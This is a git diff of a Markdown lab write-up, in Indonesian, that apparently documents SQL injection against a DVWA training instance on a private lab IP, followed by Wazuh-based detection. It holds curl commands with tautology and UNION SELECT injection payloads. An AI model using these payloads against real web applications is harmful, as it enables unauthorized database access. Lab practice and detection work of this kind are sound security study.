@@ -16,34 +16,28 @@ ke dalam input aplikasi untuk memanipulasi database.
 ## Attack Commands
 
 ### Step 1: Setup Session
-
 ```bash
 SESS="PHPSESSID=MY_SESSION; security=low"
 ```
-
-![Step 1 - Setup Session](Screenshot 2026-04-10 120522.png)
+![Step 1 - Setup Session](screenshots/Screenshot_2026-04-10_120522.png)
 
 ---
 
 ### Step 2: Basic SQL Injection
-
 ```bash
 curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
   -b "$SESS"
 ```
-
-![Step 2 - Basic SQL Injection](Screenshot_2026-04-10_11_44_09.png)
+![Step 2 - Basic SQL Injection](screenshots/Screenshot_2026-04-10_11_44_09.png)
 
 ---
 
 ### Step 3: UNION Based SQL Injection
-
 ```bash
 curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1+union+select+1,2--&Submit=Submit" \
   -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
 ```
-
-![Step 3 - UNION Based](Screenshot 2026-04-10 120914.png)
+![Step 3 - UNION Based](screenshots/Screenshot_2026-04-10_120914.png)
 
 ## Detection
 - Tool: Wazuh Custom Rules
@@ -52,4 +46,5 @@ curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1+union+select+1,2
 - Log Source: Nginx access.log (JSON format)
 
 ## Evidence
-Lihat folder `screenshots/` untuk bukti serangan dan deteksi.
+Bukti serangan dan deteksi:
+![Evidence - Wazuh Detection](screenshots/Screenshot_2026-04-10_12_36_41.png)
